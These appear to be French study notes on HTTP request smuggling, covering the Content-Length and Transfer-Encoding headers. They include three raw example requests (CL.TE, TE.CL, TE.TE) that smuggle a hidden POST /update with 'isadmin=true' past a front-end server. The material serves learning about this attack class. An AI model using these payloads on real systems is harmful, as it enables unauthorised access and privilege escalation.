

# HTTP Request Structure


1. Request Line : METHOD PATH HTTPversion
2. Request Headers
3. Message Body

![[request_structure.png]]


--- 
## Content-Length Header 

> Informe sur la taille de la requete/reponse en bytes

---
## Transfer-Encoding Header

> Indique la forme du body

- chunked 
- compress
- deflate
- gzip

---
## CL.TE - Content-Length / Transfer-Encoding


> Creer une requetes pour que le front et le back interprete différemment la requets

Exemple : 
```shell-session
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

> Le front-end voit Content-Length : 130 il va donc prendre la requete jusqu'au "isadmin=true"
> Le Back-end lui avec le Transfer-Encoding: chunked il s'arretera au 0 

> Possibilité d'avoir des accès non-autorisés pour un attaquant.

--- 
### Incorrect Content-Length 

> Si la taille du Content-Length est trop petite alors le serveur interpretra uniquement la taille du body du CL
> 

---

## TE.CL  - Transfer-Encoding / Content-Length

> C'est l'opposé de l'autre technique

```shell-session
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

> Ici le front-end grace au T.E:chunked voit la deuxieme requetes comme un body

--- 
## TE.TE - Transfer-Encoding / Transfer-Encoding

```shell-session
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```

> Le front-end va prendre toute la requetes car T.E : chunked
> Le back va interpreter différement le chunked1 via le C.L : 4

